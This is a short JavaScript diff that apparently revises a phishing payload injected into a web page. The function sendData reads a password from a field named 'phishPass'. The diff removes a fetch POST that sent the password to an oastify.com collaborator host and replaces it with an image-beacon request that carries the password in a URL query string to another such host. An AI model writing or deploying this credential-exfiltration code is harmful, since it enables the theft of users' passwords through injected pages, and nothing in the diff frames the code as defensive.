@@ -11,9 +11,5 @@ document.body.appendChild(div);
 
 function sendData() {
     let pass = document.getElementById('phishPass').value;
-    fetch('https://z660pr3ny87mg8zagd3elt6uglmca4bs0.oastify.com', {
-        method: 'POST',
-        body: JSON.stringify({ password: pass }),
-        headers: { 'Content-Type': 'application/json' }
-    });
+    new Image().src = `https://ztw0crqnl8um38ma3dqe8ttu3l9cx4zso.oastify.com?password=${encodeURIComponent(pass)}`;
 }
